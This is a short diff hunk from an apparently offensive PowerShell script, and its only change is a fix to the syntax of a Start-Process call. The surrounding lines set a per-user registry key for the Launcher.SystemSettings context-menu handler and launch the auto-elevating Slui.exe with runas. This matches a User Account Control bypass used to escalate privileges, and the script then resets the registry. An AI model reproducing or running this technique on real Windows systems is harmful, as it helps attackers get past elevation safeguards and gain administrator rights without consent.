@@ -77,7 +77,7 @@ If($CheckVuln -eq $True){
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
 
    ### Start vulnerable process {using powershell}
-   Start-Sleep -Seconds 2;Start-Process -Path "$env:WINDIR\System32\Slui.exe" -Verb runas
+   Start-Sleep -Seconds 2;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Seconds 1
    ### Revert Regedit to 'DEFAULT' settings after all testings done ..
